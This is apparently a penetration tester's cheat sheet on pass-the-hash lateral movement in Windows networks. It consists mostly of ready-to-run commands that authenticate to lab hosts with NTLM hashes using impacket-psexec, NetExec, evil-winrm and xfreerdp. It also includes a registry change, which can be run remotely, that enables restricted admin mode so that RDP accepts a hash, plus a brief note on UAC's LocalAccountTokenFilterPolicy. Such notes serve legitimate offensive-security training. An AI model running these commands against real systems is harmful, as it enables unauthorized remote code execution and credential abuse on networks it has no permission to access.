# Pass-the-hash with impacket (linux) 
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
```
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'execute_commands'
```
```
Impacket-wmiexec
```
```
Impacket-atexec
```
```
Impacket-smbexec
```

- If the SMB is blocked and we don't have admin rights 
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

# RDP 
```
xfreerdp3 /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /timeout:10000
```

>RDP disable restricted admin mode (account restriction) 
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 
```
```
nxc smb 10.129.135.84 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
#### UAC limits pass-the-hash for local accounts
- UAC (User Account Control) limits local users' ability to perform remote administration operations.  
- When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0.

It means that the built-in local admin account (RID-500, `Administrator`) is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well. 

[https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)
>IF you are stuck take a break and check the IP (interface) to get reverse shell.